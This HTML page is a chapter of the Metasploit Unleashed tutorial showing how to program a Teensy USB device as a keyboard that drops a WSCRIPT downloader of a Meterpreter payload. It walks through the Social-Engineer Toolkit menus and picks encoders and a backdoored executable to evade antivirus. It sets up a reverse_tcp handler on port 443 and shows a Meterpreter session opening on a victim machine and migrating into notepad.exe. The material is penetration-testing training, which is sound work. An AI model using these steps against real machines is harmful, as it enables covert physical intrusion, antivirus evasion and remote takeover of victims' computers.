<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Teensy USB HID Attack Vector</title>
</head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Teensy
USB HID Attack Vector</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">The Teensy USB HID Attack Vector is a
remarkable combination of
customized hardware and bypassing restrictions by keyboard emulation.
Traditionally, when you insert a DVD/CD or USB if autorun is disabled,
your autorun.inf isn&#8217;t called and you can&#8217;t execute your code
automatically. With the Teensy HID based device you can emulate a
keyboard and mouse. When you insert the device it will be detected as a
keyboard, and with the microprocessor and onboard flash memory storage
you can send a very fast set of keystrokes to the machine and
completely compromise it. You can order a Teensy device for around 17
dollars at <a href="http://www.prjc.com" class="external free"
 rel="nofollow">http://www.prjc.com</a>.
Quickly after David Kennedy, Josh Kelley, and Adrian Crewshaw&#8217;s talk on
the Teensy devices, a PS3 hack came out utilizing the Teensy devices
and they are currently backordered during the time of writing this
tutorial.
</p>
<p style="color: rgb(0, 0, 0);">Let&#8217;s setup our Teensy device to do a
WSCRIPT downloader of a
Metasploit payload. What will occur here is that a small wscript file
will be written out which will download an executable and execute it.
This will be our Metasploit payload and is all handled through the
Social-Engineer Toolkit.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">Select from the menu:<br><br>1.  Spear-Phishing Attack Vectors<br>2.  Website Attack Vectors<br>3.  Infectious Media Generator<br>4.  Create a Payload and Listener<br>5.  Mass Mailer Attack<br>6.  Teensy USB HID Attack Vector<br>7.  SMS Spoofing Attack Vector<br>8   Update the Metasploit Framework<br>9.  Update the Social-Engineer Toolkit<br>10. Help, Credits, and About<br>11. Exit the Social-Engineer Toolkit<br><br>Enter your choice: 6<br><br>Welcome to the Teensy HID Attack Vector.<br><br>Special thanks to: IronGeek and WinFang<br><br>The Teensy HID Attack Vector utilizes the teensy USB device to<br>program the device to act as a keyboard. Teensy's have onboard<br>storage and can allow for remote code execution on the physical<br>system. Since the devices are registered as USB Keyboard's it<br>will bypass any autorun disabled or endpoint protection on the<br>system.<br><br>You will need to purchase the Teensy USB device, it's roughly<br>$22 dollars. This attack vector will auto generate the code<br>needed in order to deploy the payload on the system for you.<br><br>This attack vector will create the .pde files necessary to import<br>into Arduino (the IDE used for programming the Teensy). The attack<br>vectors range from Powershell based downloaders, wscript attacks,<br>and other methods.<br><br>For more information on specifications and good tutorials visit:<br><br>http://www.irongeek.com/i.php?page=security/programmable-hid-usb-keystroke-dongle<br><br>To purchase a Teensy, visit: http://www.pjrc.com/store/teensy.html<br><br>Select a payload to create the pde file to import into Arduino:<br><br>1. Powershell HTTP GET MSF Payload<br>2. WSCRIPT HTTP GET MSF Payload<br>3. Powershell based Reverse Shell<br>4. Return to the main menu.<br><br>Enter your choice: 2<br>Do you want to create a payload and listener yes or no: yes<br>What payload do you want to generate:<br><br>Name:                                      Description:<br><br>1. Windows Shell Reverse_TCP               Spawn a command shell on victim and send back to attacker.<br>2. Windows Reverse_TCP Meterpreter         Spawn a meterpreter shell on victim and send back to attacker.<br>3. Windows Reverse_TCP VNC DLL             Spawn a VNC server on victim and send back to attacker.<br>4. Windows Bind Shell                      Execute payload and create an accepting port on remote system.<br>5. Windows Bind Shell X64                  Windows x64 Command Shell, Bind TCP Inline<br>6. Windows Shell Reverse_TCP X64           Windows X64 Command Shell, Reverse TCP Inline<br>7. Windows Meterpreter Reverse_TCP X64     Connect back to the attacker (Windows x64), Meterpreter<br>8. Windows Meterpreter Egress Buster       Spawn a meterpreter shell and find a port home via multiple ports<br>9. Import your own executable              Specify a path for your own executable<br><br>Enter choice (hit enter for default):<br><br>Below is a list of encodings to try and bypass AV.<br><br>Select one of the below, 'backdoored executable' is typically the best.<br><br>1. avoid_utf8_tolower (Normal)<br>2. shikata_ga_nai (Very Good)<br>3. alpha_mixed (Normal)<br>4. alpha_upper (Normal)<br>5. call4_dword_xor (Normal)<br>6. countdown (Normal)<br>7. fnstenv_mov (Normal)<br>8. jmp_call_additive (Normal)<br>9. nonalpha (Normal)<br>10. nonupper (Normal)<br>11. unicode_mixed (Normal)<br>12. unicode_upper (Normal)<br>13. alpha2 (Normal)<br>14. No Encoding (None)<br>15. Multi-Encoder (Excellent)<br>16. Backdoored Executable (BEST)<br><br>Enter your choice (enter for default):<br>[-] Enter the PORT of the listener (enter for default):<br><br>[-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...<br>[-] Backdoor completed successfully. Payload is now hidden within a legit executable.<br><br><br>[*] PDE file created. You can get it under 'reports/teensy.pde'<br>[*] Be sure to select "Tools", "Board", and "Teensy 2.0 (USB/KEYBOARD)" in Arduino<br>Press enter to continue.<br><br>[*] Launching MSF Listener...<br>[*] This may take a few to load MSF...<br>[-] ***<br>[-] * WARNING: No database support: String User Disabled Database Support<br>[-] ***<br><br> ____________<br>&lt; metasploit &gt;<br> ------------<br>       \   ,__,<br>        \  (oo)____<br>           (__)    )\<br>              ||--|| *<br><br><br>       =[ metasploit v3.4.2-dev [core:3.4 api:1.0]<br>+ -- --=[ 588 exploits - 300 auxiliary<br>+ -- --=[ 224 payloads - 27 encoders - 8 nops<br>       =[ svn r10268 updated today (2010.09.09)<br><br>resource (src/program_junk/meta_config)&gt; use exploit/multi/handler<br>resource (src/program_junk/meta_config)&gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>resource (src/program_junk/meta_config)&gt; set LHOST 0.0.0.0<br>LHOST =&gt; 0.0.0.0<br>resource (src/program_junk/meta_config)&gt; set LPORT 443<br>LPORT =&gt; 443<br>resource (src/program_junk/meta_config)&gt; set ExitOnSession false<br>ExitOnSession =&gt; false<br>resource (src/program_junk/meta_config)&gt; exploit -j<br>[*] Exploit running as background job.<br>msf exploit(handler) &gt;<br>[*] Started reverse handler on 0.0.0.0:443<br>[*] Starting the payload handler...</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now that we have everything ready,
SET exports a file called
teensy.pde to the reports/ folder. Copy that reports folder to wherever
you have Arduino installed. With this attack, follow the instructions
at PRJC on how to upload your code to the Teensy board; i'ts relatively
simple: you just need to install the Teensy Loader and the Teensy
libraries. Once you do that you will have an IDE interface called
Arduino. One of the MOST important aspects of this is to ensure you set
your board to a Teensy USB Keyboard/Mouse.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:SET_11.png"
 class="image"><img alt="SET 11.png"
 src="http://www.offensive-security.com/w/images/3/3d/SET_11.png"
 width="755" height="676"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
Once you have this selected, drag your pde file into the Arduino
interface. Arduino/Teensy supports Linux, OSX, and Windows. Insert your
USB device into the computer and upload your code. This will program
your device with the SET generated code. Below is uploading and the
code.
<br>
<br>
</p>
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:SET_12.png"
 class="image"><img alt="SET 12.png"
 src="http://www.offensive-security.com/w/images/6/6c/SET_12.png"
 width="700" height="613"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
Once the USB device is inserted on the victim machine our code is
executed and once finished, you should be presented with a meterpreter
shell.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">[*] Sending stage (748544 bytes) to 172.16.32.131<br>[*] Meterpreter session 1 opened (172.16.32.129:443 -&gt; 172.16.32.131:1333) at Thu Sep 09 12:52:32 -0400 2010<br>[*] Session ID 1 (172.16.32.129:443 -&gt; 172.16.32.131:1333) processing InitialAutoRunScript 'migrate -f'<br>[*] Current server process: java.exe (824)<br>[*] Spawning a notepad.exe host process...<br>[*] Migrating into process ID 3044<br>[*] New server process: notepad.exe (3044)<br>msf exploit(ms09_002_memory_corruption) &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/SET"
 title="SET">SET</a></div>
</body>
</html>
